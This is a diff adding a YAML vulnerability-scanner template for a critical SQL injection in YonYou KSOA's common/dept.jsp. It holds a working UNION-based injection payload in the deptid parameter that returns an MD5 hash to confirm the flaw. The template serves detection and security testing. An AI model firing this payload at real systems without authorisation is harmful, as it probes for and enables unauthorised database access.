@@ -1,0 +1,26 @@
+id: yonyou-ksoa-dept-sqli
+brief:
+    title: YonYou KSOA common/dept.jsp - SQL injection
+    by: DhiyaneshDK
+    level: critical
+    about: Yonyou KSOA contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the con...
+    label:
+        - yonyou
+        - oa
+        - sqli
+        - ksoa
+        - vuln
+    score: CVSS:10.0
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/common/dept.jsp?deptid=1''+UNION+ALL+SELECT+60%2Csys.fn_sqlvarbasetostr(HASHBYTES(''MD5''%2C''{{num}}''))--+'
+      signs:
+        - "on": word
+          has:
+            - 0x{{md5({{num}})}}
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
